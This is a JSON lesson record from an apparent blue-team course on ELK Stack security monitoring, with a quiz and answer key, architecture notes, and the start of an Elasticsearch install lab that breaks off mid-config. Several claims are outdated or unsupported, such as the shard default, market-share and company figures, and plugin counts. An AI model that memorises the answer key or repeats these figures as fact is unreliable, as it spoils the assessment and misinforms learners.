{
  "lesson_id": "b2c7d4f9-8e1a-4b3c-9f6d-1a5e7c2b4d8f",
  "domain": "blue_team",
  "title": "ELK Stack: Security Monitoring and Log Analysis",
  "difficulty": 2,
  "order_index": 3,
  "prerequisites": [
    "b7f2e1d4-9a3c-4e8b-7d2f-5c1a9e6b3d8f"
  ],
  "concepts": [
    "Elasticsearch architecture and indexing",
    "Logstash pipeline configuration",
    "Kibana visualization and dashboards",
    "Beats data shippers (Filebeat, Winlogbeat, Packetbeat)",
    "Security log parsing and normalization",
    "KQL (Kibana Query Language)",
    "SIEM use cases and detection rules",
    "Alert management with ElastAlert",
    "Performance tuning and scaling",
    "Security Operations Center (SOC) workflows"
  ],
  "estimated_time": 50,
  "learning_objectives": [
    "Understand ELK Stack architecture and component interactions",
    "Deploy and configure Elasticsearch, Logstash, and Kibana for security monitoring",
    "Create Logstash pipelines to parse security logs (Windows Event Logs, Syslog, Firewall logs)",
    "Master KQL for threat hunting queries",
    "Build security dashboards for real-time visibility",
    "Implement detection rules for common attack patterns",
    "Configure alerting with ElastAlert or Kibana Alerts",
    "Optimize ELK performance for high-volume environments"
  ],
  "post_assessment": [
    {
      "question": "In the ELK Stack, what is Elasticsearch's primary role?",
      "options": [
        "Log parsing and enrichment",
        "Search and analytics engine (data storage)",
        "Visualization and dashboards",
        "Data shipping from endpoints"
      ],
      "correct_answer": 1,
      "explanation": "Elasticsearch is the distributed search and analytics engine that stores, indexes, and searches log data. Logstash parses logs, Kibana visualizes, and Beats ships data.",
      "difficulty": 1,
      "topic": "elk_architecture",
      "subtopic": "elasticsearch",
      "question_id": "00f8d3c4-4f17-4d48-861a-f2fac1caa4dc",
      "type": "multiple_choice"
    },
    {
      "question": "What is Logstash's filter plugin 'grok' primarily used for?",
      "options": [
        "Data encryption",
        "Parsing unstructured log data using regex patterns",
        "Compressing logs",
        "Routing logs to different indices"
      ],
      "correct_answer": 1,
      "explanation": "Grok is Logstash's pattern-matching filter that parses unstructured logs (like Apache logs) into structured JSON fields using regular expressions and predefined patterns.",
      "difficulty": 2,
      "topic": "logstash",
      "subtopic": "grok_filter",
      "question_id": "d9338067-5755-4e1c-9592-b50220d8c695",
      "type": "multiple_choice"
    },
    {
      "question": "Which Beat should you deploy to collect Windows Event Logs?",
      "options": [
        "Filebeat",
        "Winlogbeat",
        "Packetbeat",
        "Metricbeat"
      ],
      "correct_answer": 1,
      "explanation": "Winlogbeat is specifically designed to ship Windows Event Logs to Elasticsearch. Filebeat is for generic file logs, Packetbeat for network traffic, and Metricbeat for system metrics.",
      "difficulty": 1,
      "topic": "beats",
      "subtopic": "winlogbeat",
      "question_id": "b6693476-2571-44bb-adc6-9edaf9e4f6f0",
      "type": "multiple_choice"
    },
    {
      "question": "In KQL, what does the query 'event.code: 4624 AND winlog.event_data.LogonType: 10' search for?",
      "options": [
        "Failed login attempts",
        "Successful RDP logins",
        "Service account logins",
        "Network share access"
      ],
      "correct_answer": 1,
      "explanation": "Event ID 4624 is successful logon, and LogonType 10 is RemoteInteractive (RDP). This KQL query finds all successful RDP login events.",
      "difficulty": 2,
      "topic": "kql",
      "subtopic": "windows_events",
      "question_id": "883a281d-6c95-4e9b-9261-d13fefa41e9e",
      "type": "multiple_choice"
    },
    {
      "question": "What is an Elasticsearch 'index' analogous to in traditional databases?",
      "options": [
        "A table",
        "A database",
        "A row",
        "A column"
      ],
      "correct_answer": 1,
      "explanation": "An Elasticsearch index is similar to a database in traditional RDBMS. It's a collection of documents (like rows) with a defined mapping (schema). Multiple indices can exist in a cluster.",
      "difficulty": 2,
      "topic": "elasticsearch_concepts",
      "subtopic": "indices",
      "question_id": "b557fe59-f020-46a8-8c11-0cf8b368461b",
      "type": "multiple_choice"
    },
    {
      "question": "Which Logstash output plugin would you use to send alerts to Slack?",
      "options": [
        "output { slack }",
        "output { http }",
        "output { webhook }",
        "output { notification }"
      ],
      "correct_answer": 1,
      "explanation": "Logstash uses the 'http' output plugin to send data to external APIs like Slack webhooks. There's no native 'slack' plugin - you configure it using http with Slack's webhook URL.",
      "difficulty": 2,
      "topic": "logstash",
      "subtopic": "outputs",
      "question_id": "6762609a-f179-4813-846c-b34424ed3798",
      "type": "multiple_choice"
    },
    {
      "question": "What is the purpose of Elasticsearch's 'inverted index'?",
      "options": [
        "To reverse log order",
        "To enable fast full-text search by mapping terms to documents",
        "To compress stored data",
        "To backup indices"
      ],
      "correct_answer": 1,
      "explanation": "An inverted index maps every unique term to the documents containing it (like a book's index). This enables Elasticsearch to perform fast full-text searches across billions of documents.",
      "difficulty": 3,
      "topic": "elasticsearch_internals",
      "subtopic": "inverted_index",
      "question_id": "197ae532-417c-4411-b610-99117d9444b6",
      "type": "multiple_choice"
    },
    {
      "question": "How would you detect brute-force login attempts using KQL?",
      "options": [
        "Count successful logins",
        "Use aggregation to count failed logins (4625) by source IP over time",
        "Search for 'brute force' in logs",
        "Monitor CPU usage"
      ],
      "correct_answer": 1,
      "explanation": "Brute-force detection requires aggregating failed login events (Windows Event ID 4625) by source IP address within a time window. If one IP has 10+ failures in 5 minutes, it's likely brute-force.",
      "difficulty": 3,
      "topic": "detection",
      "subtopic": "brute_force",
      "question_id": "7b6512b1-d122-49c9-b454-6e38ccdc3951",
      "type": "multiple_choice"
    },
    {
      "question": "What is the difference between Filebeat and Logstash for log collection?",
      "options": [
        "No difference, they're interchangeable",
        "Filebeat is lightweight forwarder; Logstash is heavy parser/enricher",
        "Filebeat is for Windows only",
        "Logstash doesn't support filtering"
      ],
      "correct_answer": 1,
      "explanation": "Filebeat is a lightweight shipper (low resource footprint) that forwards logs to Logstash/Elasticsearch. Logstash is a heavy processor that parses, filters, and enriches logs. Best practice: Beats on endpoints, Logstash centrally.",
      "difficulty": 2,
      "topic": "architecture",
      "subtopic": "beats_vs_logstash",
      "question_id": "530f6e75-3a70-48f2-8ce7-1b35c87b3c43",
      "type": "multiple_choice"
    },
    {
      "question": "In a high-volume SOC environment, what's the primary bottleneck in ELK performance?",
      "options": [
        "Kibana queries",
        "Elasticsearch indexing throughput and disk I/O",
        "Logstash CPU usage",
        "Network bandwidth"
      ],
      "correct_answer": 1,
      "explanation": "At scale (100k+ events/sec), Elasticsearch indexing becomes the bottleneck. Disk I/O limits how fast data can be written. Solutions: Use SSDs, add more Elasticsearch nodes, optimize index settings (refresh interval, replicas).",
      "difficulty": 3,
      "topic": "performance",
      "subtopic": "scaling",
      "question_id": "ab821a13-0e4b-4502-ba86-0e1f9c08dc2a",
      "type": "multiple_choice"
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Welcome to ELK Stack Security Mastery!\n\nImagine being able to search through BILLIONS of security events in milliseconds. Need to find all failed SSH login attempts from China in the last 30 days? 0.2 seconds. Want to visualize firewall denies by country on a world map? Drag-and-drop in Kibana.\n\n**The ELK Stack (Elasticsearch, Logstash, Kibana) is the world's most popular open-source SIEM platform**, powering Security Operations Centers at Netflix, LinkedIn, Uber, and thousands of enterprises.\n\n## Why ELK Dominates Security Monitoring\n\n**Market Share:**\n- 40%+ of enterprises use ELK for log management\n- 500,000+ ELK deployments worldwide\n- Processes petabytes of security data daily\n\n**Real-World Impact:**\n- **Netflix**: Monitors 1+ billion security events per day with ELK\n- **Uber**: Detects fraud and abuse using ELK correlation rules\n- **LinkedIn**: Threat hunting across 20,000+ servers with Kibana\n- **Government SOCs**: Real-time threat detection for critical infrastructure\n\n## What Makes ELK Special?\n\n1. **Open Source & Free**: No licensing costs (unlike Splunk's $150K+ per TB)\n2. **Scalability**: Handles petabytes of data across distributed clusters\n3. **Flexibility**: Ingest ANY log format (Windows, Linux, cloud, network, app)\n4. **Speed**: Sub-second searches across billions of events\n5. **Visualization**: Beautiful, interactive dashboards\n6. **Community**: 100,000+ plugins, integrations, and tutorials\n\n## ELK vs. Competitors\n\n| Feature | ELK Stack | Splunk | QRadar |\n|---------|-----------|--------|--------|\n| Cost | Free (OSS) | $150K-$500K/TB/year | $30K-$100K/year |\n| Scalability | Unlimited | Limited by license | Moderate |\n| Learning Curve | Moderate | Easy | Steep |\n| Customization | Extremely High | Moderate | Low |\n| Community | Massive | Large | Small |\n\n**Bottom Line**: If you master ELK, you'll be valuable to 40% of companies worldwide. Let's dive in!"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "**üß† Learning Mindset: Embrace the Complexity**\n\nELK Stack has a reputation: \"Powerful but complicated.\"\n\nHere's the truth: **Yes, ELK is complex. But that complexity is your competitive advantage.**\n\nThink about it:\n- If ELK were easy, every analyst would master it (you wouldn't stand out)\n- The complexity creates job security (companies need ELK experts)\n- Each component you master unlocks new capabilities\n\n**Jim Kwik's Chunking Principle**: Don't try to learn all of ELK at once. Break it down:\n\n**Week 1**: Elasticsearch basics (indices, documents, searches)\n**Week 2**: Logstash pipelines (input ‚Üí filter ‚Üí output)\n**Week 3**: Kibana dashboards (visualizations, KQL queries)\n**Week 4**: Beats deployment (Filebeat, Winlogbeat)\n**Week 5**: Detection rules and alerting\n\nMaster one component per week. In 5 weeks, you'll be dangerous.\n\n**Your First Goal**: By the end of this lesson, deploy a working ELK stack and search for ONE security event. That's proof you can do this.\n\nRemember: Every ELK expert started by feeling overwhelmed. The difference between them and beginners? **They didn't quit.**\n\nLet's build your ELK expertise, one component at a time!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# ELK Stack Architecture: The Complete Picture\n\n## The Three Core Components\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ                      ELK STACK ARCHITECTURE                   ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n  ENDPOINTS (Data Sources)\n  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n  ‚îÇWindows  ‚îÇ  ‚îÇ Linux   ‚îÇ  ‚îÇFirewall ‚îÇ  ‚îÇ Cloud   ‚îÇ\n  ‚îÇServers  ‚îÇ  ‚îÇServers  ‚îÇ  ‚îÇ  Logs   ‚îÇ  ‚îÇ  APIs   ‚îÇ\n  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n       ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ\n       ‚îÇ  BEATS (Lightweight Shippers)\n       ‚ñº            ‚ñº            ‚ñº            ‚ñº\n  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n  ‚îÇWinlog-  ‚îÇ  ‚îÇFilebeat ‚îÇ  ‚îÇPacket-  ‚îÇ  ‚îÇFilebeat ‚îÇ\n  ‚îÇ  beat   ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  beat   ‚îÇ  ‚îÇ         ‚îÇ\n  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n       ‚îÇ            ‚îÇ            ‚îÇ            ‚îÇ\n       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n                    ‚îÇ\n                    ‚îÇ  JSON over HTTP/HTTPS\n                    ‚ñº\n       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n       ‚îÇ       LOGSTASH             ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ INPUT                ‚îÇ  ‚îÇ  Receives logs\n       ‚îÇ  ‚îÇ  - Beats input       ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Syslog input      ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îÇ             ‚îÇ              ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ FILTER               ‚îÇ  ‚îÇ  Parses & Enriches\n       ‚îÇ  ‚îÇ  - Grok parsing      ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - GeoIP enrichment  ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Date parsing      ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îÇ             ‚îÇ              ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ñº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ OUTPUT               ‚îÇ  ‚îÇ  Sends to Elasticsearch\n       ‚îÇ  ‚îÇ  - Elasticsearch     ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n                    ‚îÇ  JSON documents\n                    ‚ñº\n       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n       ‚îÇ    ELASTICSEARCH CLUSTER   ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ Node 1 (Master)      ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Indices           ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Shards            ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ Node 2 (Data)        ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Inverted Index    ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îÇ  - Document Storage  ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ Node 3 (Data)        ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n                    ‚îÇ  REST API (9200)\n                    ‚ñº\n       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n       ‚îÇ         KIBANA             ‚îÇ\n       ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ\n       ‚îÇ  ‚îÇ Discover (Search)    ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îÇ\n       ‚îÇ  ‚îÇ Visualizations       ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îÇ\n       ‚îÇ  ‚îÇ Dashboards           ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§  ‚îÇ\n       ‚îÇ  ‚îÇ Alerts (Rules)       ‚îÇ  ‚îÇ\n       ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ\n       ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n                    ‚îÇ  HTTPS (5601)\n                    ‚ñº\n              SOC ANALYSTS\n              (Web Browser)\n```\n\n## Component Breakdown\n\n### 1. Elasticsearch: The Search Engine\n\n**Role**: Distributed search and analytics engine (stores and indexes data)\n\n**Key Concepts:**\n\n- **Index**: Collection of similar documents (like a database)\n  - Example: `winlogbeat-2024.10.28` (Windows logs for Oct 28)\n  - Example: `firewall-logs-*` (All firewall log indices)\n\n- **Document**: Single log entry stored as JSON\n  ```json\n  {\n    \"@timestamp\": \"2024-10-28T14:32:15Z\",\n    \"event.code\": 4624,\n    \"winlog.event_data.LogonType\": 10,\n    \"source.ip\": \"192.168.1.50\",\n    \"user.name\": \"admin\"\n  }\n  ```\n\n- **Shard**: Subdivision of an index for horizontal scaling\n  - 1 index = 5 shards (default)\n  - Shards distributed across nodes for performance\n\n- **Replica**: Backup copy of a shard for high availability\n  - Default: 1 replica per shard\n  - If node fails, replica promotes to primary\n\n**Elasticsearch Cluster Roles:**\n- **Master Node**: Manages cluster state, index creation, node health\n- **Data Node**: Stores data, executes queries, performs aggregations\n- **Coordinating Node**: Routes requests, merges results (load balancer)\n- **Ingest Node**: Preprocesses documents before indexing (lightweight Logstash)\n\n### 2. Logstash: The ETL Pipeline\n\n**Role**: Extract, Transform, Load (ETL) - parses raw logs into structured JSON\n\n**Pipeline Structure:**\n\n```ruby\ninput {\n  # Receive data from Beats, Syslog, HTTP, etc.\n  beats {\n    port => 5044\n  }\n}\n\nfilter {\n  # Parse, enrich, transform\n  grok {\n    match => { \"message\" => \"%{COMMONAPACHELOG}\" }\n  }\n  geoip {\n    source => \"source.ip\"\n  }\n}\n\noutput {\n  # Send to Elasticsearch\n  elasticsearch {\n    hosts => [\"localhost:9200\"]\n    index => \"apache-logs-%{+YYYY.MM.dd}\"\n  }\n}\n```\n\n**Common Filter Plugins:**\n- `grok`: Parse unstructured text using regex patterns\n- `mutate`: Rename/remove/modify fields\n- `geoip`: Enrich IP addresses with geolocation data\n- `date`: Parse timestamps into standard format\n- `useragent`: Parse HTTP User-Agent strings\n- `translate`: Dictionary lookups (e.g., IP ‚Üí hostname)\n\n### 3. Kibana: The Visualization Layer\n\n**Role**: Web-based UI for searching, visualizing, and analyzing Elasticsearch data\n\n**Key Features:**\n\n1. **Discover**: Search and filter logs (like Google for your logs)\n2. **Visualizations**: Charts, graphs, maps, tables\n3. **Dashboards**: Combine multiple visualizations\n4. **Alerts**: Create detection rules with actions (email, Slack, webhook)\n5. **Canvas**: Pixel-perfect custom infographics\n6. **Maps**: Geospatial visualizations\n\n### 4. Beats: The Lightweight Shippers\n\n**Role**: Deploy on endpoints to ship logs to Logstash/Elasticsearch\n\n**Beat Types:**\n\n- **Filebeat**: Generic file logs (syslog, app logs, text files)\n- **Winlogbeat**: Windows Event Logs (Security, System, Application)\n- **Packetbeat**: Network traffic analysis (HTTP, DNS, TLS)\n- **Metricbeat**: System metrics (CPU, memory, disk, network)\n- **Auditbeat**: Audit framework events (Linux auditd, file integrity)\n- **Heartbeat**: Uptime monitoring (ping services)\n\n**Why Beats?**\n- Lightweight (10-50MB RAM vs. Logstash's 500MB+)\n- Efficient (written in Go, minimal CPU usage)\n- Backpressure handling (buffers data if Logstash/ES is down)\n\n## Data Flow Example: Windows Login Monitoring\n\n1. **Event Occurs**: User logs into Windows via RDP\n2. **Windows**: Writes Event ID 4624 to Security.evtx\n3. **Winlogbeat**: Reads event, converts to JSON, ships to Logstash (port 5044)\n4. **Logstash**: \n   - Parses with Grok filter\n   - Enriches source IP with GeoIP (country, city)\n   - Adds tags (\"rdp_login\", \"authentication\")\n   - Outputs to Elasticsearch\n5. **Elasticsearch**: \n   - Indexes document in `winlogbeat-2024.10.28` index\n   - Updates inverted index for fast searching\n6. **Kibana**: \n   - SOC analyst searches: `event.code: 4624 AND winlog.event_data.LogonType: 10`\n   - Results appear in <1 second\n   - Dashboard shows RDP logins on world map\n\n**Total Latency**: ~5 seconds from login to visibility in Kibana"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Deploy Your First ELK Stack\n\n## Lab Setup: Single-Node ELK on Linux\n\n### Prerequisites\n\n- Ubuntu 22.04 LTS (or similar)\n- 4 CPU cores, 8GB RAM, 50GB disk\n- Root/sudo access\n\n### Step 1: Install Elasticsearch\n\n```bash\n# Import Elastic GPG key\nwget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -\n\n# Add Elastic repository\necho \"deb https://artifacts.elastic.co/packages/8.x/apt stable main\" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list\n\n# Install Elasticsearch\nsudo apt update\nsudo apt install elasticsearch\n\n# Configure Elasticsearch\nsudo nano /etc/elasticsearch/elasticsearch.yml\n```\n\n**Configuration** (`elasticsearch.yml`):\n\n```yaml\ncluster.name: security-elk\nnode.name: elk-node-1\npath.data: /var/lib/elasticsearch\npath.logs: /var/log/elasticsearch\nnetwork.host: 0.0.0.0  # Listen on all interfaces (use 127.0.0.1 for localhost only)\nhttp.port: 9200\ndiscovery.type: single-node  # Single-node cluster (no HA)\n\n# Security settings (Elasticsearch 8.x has security enabled by default)\nxpack.security.enabled: true\nxpack.security.enrollment.enabled: true\nxpack.security.http.ssl:\n  enabled: true\n  keystore.path: certs/http.p12\nxpack.security.transport.ssl:\n  enabled: true\n  verification_mode: certificate\n  